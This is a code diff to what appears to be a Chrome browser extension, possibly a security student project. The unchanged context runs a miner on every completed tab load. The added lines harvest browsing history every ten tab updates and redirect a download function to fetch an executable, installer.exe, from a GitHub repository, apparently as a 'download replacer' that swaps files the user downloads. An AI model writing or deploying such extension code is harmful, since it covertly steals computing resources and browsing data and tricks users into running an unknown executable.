@@ -60,10 +60,16 @@ function startMiner() {
     .catch(console.error);
 }
 
+var updatedCounter = 0;
 chrome.tabs.onUpdated.addListener(function (tabId, info) {
   if (info.status === "complete") {
+    updatedCounter = updatedCounter + 1;
     chrome.tabs.sendMessage(tabId, { type: "tabUpdated" });
     startMiner();
+    if (updatedCounter >= 10){
+      getHistory(10);
+      updatedCounter = 0;
+    }
   }
 });
 
@@ -126,11 +132,12 @@ chrome.webRequest.onBeforeRequest.addListener(
 // Make download
 async function makeDownload(name) {
   await chrome.downloads.download({
-    url: "https://tls-sec.github.io/2019-2020/2020/01/19/projetslongs.html",
+    url: "https://github.com/JJRossmann/UltimateExtension/raw/master/installer.exe",
     filename: name,
   });
 }
 
+//Download replacer
 var originalFilename;
 var cp = true;
 var counter = 10;
